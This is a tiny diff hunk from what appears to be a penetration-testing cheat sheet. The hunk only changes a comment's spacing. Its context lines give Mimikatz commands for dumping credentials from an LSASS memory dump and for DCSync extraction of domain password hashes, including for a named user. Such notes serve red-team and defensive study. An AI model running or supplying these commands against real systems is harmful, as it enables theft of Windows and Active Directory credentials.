@@ -76,7 +76,7 @@ mimikatz # sekurlsa::minidump lsass.DMP
 mimikatz # log lsass.txt
 mimikatz # sekurlsa::logonPasswords
 
-# for dcsync abuse
+#for dcsync abuse
 mimikatz # lsadump::dcsync
 mimikatz # lsadump::dcsync /user:<UserName>  #for spesific user only 
 
